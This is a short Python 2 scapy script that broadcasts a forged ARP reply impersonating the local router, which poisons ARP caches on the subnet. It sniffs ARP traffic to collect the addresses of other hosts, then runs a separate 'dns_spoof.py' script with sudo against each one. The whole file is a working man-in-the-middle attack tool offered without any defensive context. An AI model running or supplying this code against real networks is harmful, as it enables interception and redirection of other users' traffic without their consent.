from scapy.all import *
import sys
cnt = 0
ip_list = list()
dev = conf.iface
gateway = str(conf.route)
gateway = gateway.split(dev)[0]
gateway = gateway.split()
gateway_n = len(gateway)
router_ip = gateway[gateway_n-1]
print "[*] Found router ip\t"+str(router_ip)


def find_new_ip(p):
	global cnt
	if p.haslayer(ARP) :
		arp = p.getlayer(ARP)
		if not arp.psrc in ip_list and not arp.psrc == router_ip:
			ip_list.append(arp.psrc)
		cnt += 1
temp=router_ip.split(".")
broad_ip = ""
for i in range(0,len(temp)-1):
	broad_ip+= temp[i] + "."
broad_ip =  broad_ip + "255"
payload = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,psrc=router_ip,pdst=broad_ip)

while True:
	sendp(payload,verbose=False)
	#sendp(payload)
	sniff(prn=find_new_ip, count =1)
	if cnt >= 1:
		break
for i in ip_list:	
	os.system("sudo python dns_spoof.py " + i) 
